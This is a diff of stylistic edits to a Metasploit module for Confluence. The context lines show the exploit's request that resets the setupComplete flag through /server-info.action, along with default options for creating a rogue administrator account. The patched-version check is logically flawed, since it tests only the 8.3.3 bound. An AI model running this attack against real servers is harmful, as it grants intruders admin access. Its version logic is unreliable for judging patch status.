@@ -30,16 +30,21 @@ class MetasploitModule < Msf::Auxiliary
         'DefaultOptions' => {
           'RPORT' => 8090
         },
-        'License' => MSF_LICENSE
+        'License' => MSF_LICENSE,
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'Reliability' => [REPEATABLE_SESSION],
+          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES]
+        }
       )
     )
 
     register_options([
-                       OptString.new('TARGETURI', [true, 'Base path', '/']),
-                       OptString.new('NEW_USERNAME', [true, 'Username to be used when creating a new user with admin privileges', 'admin_1337']),
-                       OptString.new('NEW_PASSWORD', [true, 'Password to be used when creating a new user with admin privileges', 'admin_1337']),
-                       OptString.new('NEW_EMAIL', [true, 'E-mail to be used when creating a new user with admin privileges', 'admin_1337@localhost.com'])
-                     ])
+      OptString.new('TARGETURI', [true, 'Base path', '/']),
+      OptString.new('NEW_USERNAME', [true, 'Username to be used when creating a new user with admin privileges', 'admin_1337']),
+      OptString.new('NEW_PASSWORD', [true, 'Password to be used when creating a new user with admin privileges', 'admin_1337']),
+      OptString.new('NEW_EMAIL', [true, 'E-mail to be used when creating a new user with admin privileges', 'admin_1337@localhost.com'])
+    ])
   end
 
   def check
@@ -48,7 +53,7 @@ class MetasploitModule < Msf::Auxiliary
 
     vprint_status("Detected Confluence version: #{confluence_version}")
 
-    unless confluence_version < Rex::Version.new('8.3.3') and Rex::Version.new('8.4.3') and Rex::Version.new('8.5.2')
+    unless (confluence_version < Rex::Version.new('8.3.3')) && Rex::Version.new('8.4.3') && Rex::Version.new('8.5.2')
       return Exploit::CheckCode::Safe("Patched Confluence version #{confluence_version} detected.")
     end
 
@@ -75,7 +80,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-
     res = send_request_cgi(
       'method' => 'GET',
       'uri' => normalize_uri(target_uri.path, '/server-info.action'),
@@ -83,7 +87,7 @@ class MetasploitModule < Msf::Auxiliary
         'X-Atlassian-Token' => 'no-check'
       },
       'vars_get' => {
-        'bootstrapStatusProvider.applicationConfig.setupComplete' => 'false',
+        'bootstrapStatusProvider.applicationConfig.setupComplete' => 'false'
       }
     )
 
@@ -123,6 +127,5 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     return fail_with(Msf::Exploit::Failure::NoAccess, 'The admin user could not be created. Try a different username.') unless res&.code == 302
-
   end
 end
